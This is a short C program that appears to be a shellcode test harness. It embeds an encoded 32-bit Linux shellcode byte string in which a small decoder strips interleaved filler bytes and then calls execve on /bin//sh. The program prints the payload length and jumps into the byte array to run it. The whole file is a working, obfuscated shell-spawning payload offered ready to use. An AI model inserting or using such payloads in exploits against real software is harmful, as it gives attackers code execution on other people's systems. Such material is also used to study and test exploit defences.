#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x1d\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80\xf3\x47\x75\x10\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xeb\xed\xe8\xde\xff\xff\xff\x31\x47\xc0\x47\x50\x47\x68\x47\x2f\x47\x2f\x47\x73\x47\x68\x47\x68\x47\x2f\x47\x62\x47\x69\x47\x6e\x47\x89\x47\xe3\x47\x50\x47\x89\x47\xe2\x47\x53\x47\x89\x47\xe1\x47\xb0\x47\x0b\x47\xcd\x47\x80\x47\x74\x74";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
